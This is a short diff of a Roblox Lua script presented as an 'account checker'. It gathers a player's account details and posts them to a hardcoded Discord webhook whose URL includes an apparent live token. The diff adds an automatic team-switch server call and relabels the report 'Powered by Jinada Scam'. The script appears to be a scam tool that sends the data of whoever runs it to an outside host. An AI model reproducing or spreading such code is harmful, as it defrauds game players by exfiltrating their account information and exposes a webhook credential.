@@ -1,3 +1,5 @@
+game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetTeam","Marines")
+wait(5)
 -- LocalScript: Full Account Checker + Webhook + UI (fixed webhook)
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1455571104864141425/BEuHf_5yUFEQtyjPAebaFYGeNbh87gyVG_DwFgfeIKDkvVyK7EtSfxF9gc97trh9skIv"
 
@@ -107,7 +109,7 @@ end
 local function SendWebhook(data)
     local embed = {
         ["title"] = "Account Report — " .. tostring(data.Name),
-        ["description"] = "Собрано через CommF_",
+        ["description"] = "Powered by Jinada Scam",
         ["color"] = 3447003,
         ["fields"] = {
             {["name"]="Имя",                 ["value"]=data.Name,                 ["inline"]=true},
